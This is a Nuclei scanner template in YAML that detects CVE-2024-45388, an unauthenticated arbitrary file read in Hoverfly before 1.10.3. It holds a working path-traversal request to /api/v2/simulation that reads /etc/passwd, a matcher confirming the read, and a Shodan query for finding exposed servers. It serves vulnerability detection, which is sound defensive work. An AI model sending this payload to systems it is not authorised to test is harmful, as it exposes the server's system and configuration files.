http:
- matchers:
  - condition: and
    regex:
    - 'root:.*:0:0:'
    - hoverflyVersion
    type: regex
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'PUT /api/v2/simulation HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    {"data":{"pairs":[{"request":{},"response":{"bodyFile": "../../../../../../../etc/passwd","x":"aaa"}}
    ]},"meta":{"schemaVersion":"v5.3"}}

    '
id: CVE-2024-45388
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-45388
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-20
    epss-percentile: 0.99821
    epss-score: 0.93585
  description: 'Hoverfly is a lightweight service virtualization/ API simulation /
    API mocking tool for developers and testers. The /api/v2/simulation POST handler
    allows users to create new simulation views from the contents of a user-specified
    file. This feature can be abused by an attacker to read arbitrary files from the
    Hoverfly server.

    '
  impact: 'Unauthenticated attackers can read arbitrary files from the Hoverfly server
    including sensitive configuration data.

    '
  metadata:
    max-request: 1
    shodan-query: http.favicon.hash:1357234275
    verified: true
  name: Hoverfly < 1.10.3 - Arbitrary File Read
  reference:
  - https://github.com/advisories/GHSA-6xx4-x46f-f897
  - https://nvd.nist.gov/vuln/detail/CVE-2024-45388
  remediation: 'Update Hoverfly to version 1.10.3 or later.

    '
  severity: high
  tags: cve,cve2024,hoverfly,lfi,intrusive,vkev,vuln
